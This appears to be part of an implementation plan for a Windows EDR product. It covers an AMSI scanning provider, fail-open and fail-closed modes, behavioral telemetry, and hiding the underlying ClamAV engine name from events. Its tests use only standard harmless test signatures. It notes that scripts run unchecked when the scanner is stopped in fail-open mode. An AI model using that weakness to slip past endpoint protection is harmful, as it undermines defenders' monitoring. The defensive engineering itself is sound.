- [ ] **Step 1: Build + deploy** (Plan 1–3 setup; build + sign the DLL from Task 3; place `utmstack_amsi.dll` in the install dir; `enable-edr` registers it).

- [ ] **Step 2: AMSI block (the core script capability)**

Enable PowerShell script-block logging, then run the AMSI test string in a new PowerShell:

```powershell
# The standard AMSI test string; with our provider registered and clamd flagging
# an EICAR-style script, execution should be blocked pre-execution.
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# Or drop an EICAR-carrying .ps1 and try to run it.
```
Expected: the malicious script is blocked before running; the spool has an `amsi` event with `"action":"blocked"`, branded, no `clam` string; the platform receives it.

- [ ] **Step 3: Fail-open behavior**

Stop clamd; run a script; confirm it is allowed (fail-open default) and a `health` amsi event is emitted. Set `fail_mode=closed`, repeat; confirm it is blocked.

- [ ] **Step 4: Behavioral telemetry**

Run an Office→PowerShell / encoded-command chain; confirm `behavioral` events (process_create + script_block with deobfuscated text) reach the platform, branded, no `clam`.

- [ ] **Step 5: Labeling audit**

`Select-String -Path .\edr-spool\events.ndjson -Pattern 'clam'` and the service log → both empty.

- [ ] **Step 6: Commit fixes + finalize Phase 1**

```bash
git add -A && git commit -m "fix(edr): plan 4 VM acceptance adjustments; Phase 1 Windows complete"
```

---

## Self-Review (against the spec)

**Spec coverage (Plan 4 slice):**
- §4.7 AMSI provider (native COM DLL, forwards to service, fail-open/closed, Authenticode) → Tasks 1–4. ✔
- §4.8 Allowlisting — **out of scope** (Phase 2), correctly absent. ✔
- §4.9 Behavioral forwarder (process-creation + PowerShell 4104 + AMSI content → platform; Sigma lives platform-side) → Tasks 5, 6. ✔
- §6.3 script/fileless AMSI flow → Tasks 1–4, 7. ✔
- Branding preserved (`source ∈ {amsi, behavioral}`, DLL strings say "UTMStack EDR", no engine name) → tests in Tasks 1, 5 + VM audit Task 7. ✔
- Go-first single exception (the DLL) honored; ordinary Authenticode signing (Task 3 Step 4). ✔
- Honest AMSI limits documented (Global Constraints). ✔

**Placeholder scan:** the Go scan core, event helpers, registration, and telemetry builders have complete code + `go test`. The named-pipe transport, the C/C++ DLL, HKLM registration effect, and 4104 reading are concrete code with explicit VM verification points — the honest substitute where macOS can't exercise Windows/native behavior.

**Type consistency:** `amsi.Scanner.ScanBuffer(appName string, data []byte) bool` is called by `PipeServer.handle`. `amsi.Register/Unregister` signatures match across build tags. `behavioral.ProcTelemetry(proctable.Proc)` and `ScriptBlockTelemetry(string,string)` return `event.Event` consumed via `ToJSON`. `CLSID` string is identical in the DLL (Task 3) and `register_windows.go` (Task 4) — **must stay byte-identical** (same GUID) or Windows won't load the provider.

**Phase 1 (Windows) complete after this plan** — files, processes, and scripts are covered by detect-and-kill + AMSI, with behavioral telemetry feeding the platform. Only the Phase 2 WDAC allowlisting manager remains out of scope.

## Implementation deviations (during implementation + VM validation, 2026-07-02)

- **Engine-process telemetry leak (branding).** The behavioral forwarder emits `process_create` for every process; the EDR's own engine helpers (`clamd`/`freshclam`/`clamdscan`) and their command lines carry the engine name → "clam" leaked into events. Fix: `procwatch.Dispatch` now takes a `skip func(image) bool`; the service passes the excluder (extended to include `filepath.Dir(cfg.ClamdPath)` and `EngineDir`) so the EDR's own engine processes are excluded from telemetry **and** guard scanning. Residual, out-of-scope: a third party's script/command that itself references "clamav" would still surface in 4104/command-line telemetry — that is not the EDR revealing its engine, and scrubbing all telemetry would harm fidelity.
- **AMSI DLL not built on the test VM.** The VM has no C/C++ toolchain (no MSVC / Windows SDK / `amsi.h`), so the native `utmstack_amsi.dll` could not be compiled there. The **Go side was validated end-to-end with a mock pipe client** speaking the DLL's wire protocol: marker content → verdict byte `1` (block) + branded `amsi:blocked` event; benign content → `0` (allow, no event); fail-open/closed honored. Behavioral `process_create` and PowerShell `script_block` (4104) telemetry both verified in the spool; labeling audit clean (0 `clam`) after the fix above. The native DLL (Task 3) still requires an MSVC + Windows SDK build box (+ Authenticode signing) to compile and to run the real PowerShell→AMSI→DLL→pipe path.
- **Process-telemetry volume.** `process_create` for every launch is a firehose; consider sampling/filtering (e.g. only unsigned or non-OS images) before fleet rollout.
